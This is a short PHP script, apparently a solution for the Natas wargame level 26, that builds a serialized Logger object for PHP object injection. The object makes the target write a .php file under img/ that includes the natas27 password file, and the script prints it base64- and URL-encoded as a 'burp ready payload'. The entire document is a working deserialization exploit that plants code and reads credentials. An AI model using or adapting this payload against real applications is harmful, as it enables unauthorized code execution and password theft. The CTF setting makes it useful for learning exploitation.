<?
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
        function __construct($file){
            //include the key
            $this->exitMsg = "natas27:<? include '/etc/natas_webpass/natas27'; ?>";
            //cat /dev/urandom | base64 | head -c 14
            $this->logFile = "img/NlP6TEsjSEMYsD.php";
        }                       
        function log($msg){
            ;
        }                       
        function __destruct(){
            ;
        }                       
    }
$payload = new Logger("NlP6TEsjSEMYsD");
//print out a burp ready payload
echo urlencode(base64_encode(serialize($payload)));
?>
